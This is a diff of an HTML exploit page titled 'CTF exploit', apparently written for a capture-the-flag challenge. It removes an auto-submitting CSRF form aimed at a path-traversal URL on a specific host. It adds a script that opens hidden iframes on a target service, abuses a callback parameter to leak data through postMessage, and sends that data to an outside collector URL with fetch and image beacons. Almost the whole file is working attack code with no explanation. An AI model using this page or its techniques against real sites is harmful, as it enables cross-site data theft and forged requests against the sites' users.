@@ -1,26 +1,28 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>attack</title>
-<form id="f" action="" method="POST">
-  <input type="hidden" name="_csrf" id="csrf">
-  <input type="hidden" name="username" id="user">
-  <input type="hidden" name="role" id="role">
-  <button type="submit">Submit</button>
-</form>
+<title>CTF exploit</title>
 <script>
-  const qs = new URLSearchParams(location.search);
-  const token = qs.get('token') || '';
-  const user  = qs.get('user')  || 'guide_kid';
-  const role  = qs.get('role')  || 'guide';
-  const action= qs.get('action')|| 'http://35.198.141.47:30364/public/..%2fawaken';
-  const auto  = qs.get('auto') ?? '1';
+const EXFIL_URL = "https://ucurxln.request.dreamhack.games/collect?d=";
 
-  document.getElementById('csrf').value = token;
-  document.getElementById('user').value = user;
-  document.getElementById('role').value = role;
-  document.getElementById('f').action = action;
+window.addEventListener('message', (ev) => {
+  try {
+    const data = ev.data && (typeof ev.data === 'string' ? {info: ev.data} : ev.data);
+    const msg = (data && (data.info ?? data)) + "";
+    try { fetch(EXFIL_URL + encodeURIComponent(msg)); } catch (e) {}
+    try { (new Image).src = EXFIL_URL + encodeURIComponent(msg); } catch (e) {}
+  } catch (e) {}
+});
 
-  if (token && auto !== '0') {
-    setTimeout(() => document.getElementById('f').requestSubmit(), 300);
-  }
+const f1 = document.createElement('iframe');
+f1.src = "http://home:8001/post";
+f1.style.cssText = "width:0;height:0;border:0;";
+document.body.appendChild(f1);
+
+setTimeout(() => {
+  const f2 = document.createElement('iframe');
+  f2.src = "http://home:8001/callback?callback=parent.postMessage";
+  f2.style.cssText = "width:0;height:0;border:0;";
+  document.body.appendChild(f2);
+}, 1500);
 </script>
+<p>Working…</p>
